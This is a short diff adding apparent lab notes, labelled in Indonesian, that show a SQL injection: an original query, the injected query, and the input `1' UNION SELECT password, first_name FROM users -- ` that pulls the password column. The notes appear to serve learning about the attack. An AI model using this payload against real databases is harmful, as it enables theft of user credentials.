@@ -1,0 +1,8 @@
+Query Asal:
+SELECT first_name, last_name FROM users WHERE user_id='1'
+
+Query Injection:
+SELECT first_name, last_name FROM users WHERE user_id='1' UNION SELECT password, first_name FROM users -- '
+
+Input:
+1' UNION SELECT password, first_name FROM users -- 
